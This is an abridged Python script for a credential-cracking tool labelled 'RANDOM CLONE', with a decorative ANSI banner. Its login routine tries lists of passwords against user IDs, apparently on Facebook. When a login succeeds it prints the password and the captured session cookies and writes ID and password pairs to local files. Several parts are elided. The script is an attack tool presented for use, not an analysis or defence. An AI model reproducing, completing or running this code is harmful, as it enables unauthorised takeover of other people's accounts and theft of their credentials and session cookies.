#credit mr mivi
import os,sys,time,json,random,re,string,platform,baseuuid
...
X='\033[1;30m'
logo =("""
\x1b[1;95m┏┓┓┏┳┓┏┓┳┓  ┓┏┓┓\033[38;5;46m
\x1b[1;95m┃ ┗┫┣┫┣ ┣┫  ┃┃┫┃\033[38;5;46m
\x1b[1;95m┗┛┗┛┻┛┗┛┛┗  ┻┗┛┻ \033[38;5;46m          
\033[38;5;46m'╱╱╱╭━╮╱╱╱╱╭━╮╱╱╱\033[38;5;4
\033[38;5;46m'╱╱╱┃╮┗━━━━┛╭┃╱╱╱\033[38;5;46
\033[38;5;46m'╱╱╱╰╱┈╮┈┈╭┈╲╯╱╱╱\033[38;5;46
\033[38;5;46m'╱╱╱▕▕▊┈┈┈▕▊┈▏╱╱╱\033[38;5;196
\033[38;5;46m'╭┳╮┈╲┈┈▅┈┈┈╱┈╭┳╮\033[38;5;196
\033[38;5;46m'┃╰╰▔▔╲╰┻╯┈╱▔▔╯╯┃  \033[38;5;196
\033[38;5;46m'╰━━━╮┈▔▔▔▔┈╭━━━╯\033[38;5;46
\033[38;5;46m'╱╱╱╱┃┊┊┊┊┊┊┃╱╱╱╱\033[38;5;46
...
\033[38;5;46m'┻┻┈╭╯┈┈┣┫┈┈╰╮┈┻╨\033[38;5;196
\033[38;5;46m'╭╮▔╰┻┻━╯╰━┻┻╯▔┈┻\033[38;5;196
 \033[1;91m<═══\033[1;41m\033[1;97m 𝗖𝗬𝗕𝗘𝗥 101 𝗧𝗘𝗔𝗠 𝗕𝗥𝗢 \033[;0m\033[1;91m═══>\033[1;92m                           
\033[1;35m╔════════════════════════════════════════╗
\x1b[1;92m \x1b[1;95m[\x1b[1;93m𓆩♡𓆪\x1b[1;95m]\33[1;93m AUTHOR    : SUNY BOSS             
\x1b[1;92m \x1b[1;95m[\x1b[1;93m𓆩♡𓆪\x1b[1;95m] \33[1;93mFACEBOOK  : ALONE LOVER            
\x1b[1;92m \x1b[1;95m[\x1b[1;93m𓆩♡𓆪\x1b[1;95m] \33[1;93mTOOL      : RANDOM CLONE
\x1b[1;92m \x1b[1;95m[\x1b[1;93m𓆩♡𓆪\x1b[1;95m] \33[1;93mVERSION   : 0.3        
\033[1;35m╚════════════════════════════════════════╝""")
...
def Main():
        os.system("clear")
        print(logo)
        print("\033[1;32m \x1b[1;95m\x1b[1;97m[\x1b[1;95mA\x1b[1;97m]\33[1;9m RANDOM CRACK")
        print(" \033[1;32m\x1b[1;95m\x1b[1;97m[\x1b[1;95mB\x1b[1;97m]\33[1;92m Exit")
        print('\033[1;30m───────────────────────────────────────────')
...
def fuck():
    ...
    print('\033[1;30m───────────────────────────────────────────')
    print(' [+] OK Ids saved in Suny🌺/OK.txt')
    print(' [+] CP Ids saved in Suny🌺/CP.txt')
    print('\033[1;30m───────────────────────────────────────────')
...
def naim2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [Suny🌺]-[%s|%s]\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                coki=";taybul".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;97m [\33[1;92mSuny🌺-OK\33[1;97m] \33[1;92m'+cid+' | '+ps+'\33[0;92m')
                print (f"\033[1;31m[\033[1;37m🌼\033[1;31m]\033[1;35m COOKIES: {coki} ")
                print('\033[1;32m•─────────────────────•°•❀•°•──────────────────•')
                open('Suny🌺-OK.txt', 'a').write(cid+' | '+ps+'\n')
